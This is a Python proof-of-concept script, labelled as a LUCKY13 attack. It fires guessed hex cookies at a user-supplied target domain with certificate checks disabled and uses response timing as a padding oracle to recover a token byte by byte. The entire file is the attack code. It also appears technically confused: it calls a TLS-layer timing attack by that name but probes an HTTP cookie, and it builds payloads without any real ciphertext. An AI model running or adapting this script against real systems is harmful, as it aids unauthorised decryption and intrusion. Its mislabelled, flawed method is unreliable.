import requests
import time
import binascii
from urllib3 import disable_warnings
from urllib3.exceptions import InsecureRequestWarning

# Disable SSL warnings
disable_warnings(InsecureRequestWarning)

def create_payload(token_position, known_bytes):
    """Create properly encoded CBC padding test payload"""
    prefix = b'A' * (16 - token_position)
    known_part = bytes([k ^ (16-token_position) for k in known_bytes])
    
    # Return raw bytes for hex representation
    return prefix + known_part

def test_byte(guess, prefix, known_part):
    """Test a single byte guess"""
    try:
        # Build cookie with proper encoding
        payload = prefix + bytes([guess]) + known_part
        cookie_value = binascii.hexlify(payload).decode('ascii')
        
        headers = {
            "Cookie": f"test={cookie_value}",  # Using hex representation
            "User-Agent": "LUCKY13-TEST/1.0"
        }
        
        start = time.time()
        response = requests.get(
            "https://enterTargetHere",	# Enter vuln domain here
            headers=headers,
            verify=False,
            timeout=3
        )
        elapsed = time.time() - start
        
        return elapsed
        
    except Exception as e:
        print(f"Error testing byte {guess}: {str(e)}")
        return None

def decrypt_byte(token_position, known_bytes):
    """Attempt to decrypt one byte"""
    prefix, known_part = create_payload(token_position, known_bytes)[:16-token_position], create_payload(token_position, known_bytes)[16-token_position:]
    
    print(f"[*] Testing position {token_position} with {len(known_bytes)} known bytes")
    
    candidates = []
    for guess in range(256):
        elapsed = test_byte(guess, prefix, known_part)
        if elapsed is not None:
            candidates.append((guess, elapsed))
            
    if not candidates:
        return None
        
    # Return byte with shortest response time (valid padding)
    candidates.sort(key=lambda x: x[1])
    return candidates[0][0]

if __name__ == "__main__":
    print("[*] Starting LUCKY13 POC ")
    print("[!] This will take approximately 5-10 minutes per byte")
    
    known_bytes = []
    for position in range(1, 17):
        byte = decrypt_byte(position, known_bytes)
        if byte is None:
            print(f"[-] Failed at position {position}")
            break
            
        known_bytes.insert(0, byte)  # Insert at beginning (we decrypt backwards)
        current_token = bytes(known_bytes).hex()
        print(f"[+] Position {position}: 0x{byte:02x} | Current token: {current_token}")
    
    if known_bytes:
        print("\n[+] Final decrypted token:", bytes(known_bytes).hex())
    else:
        print("[-] Attack failed")
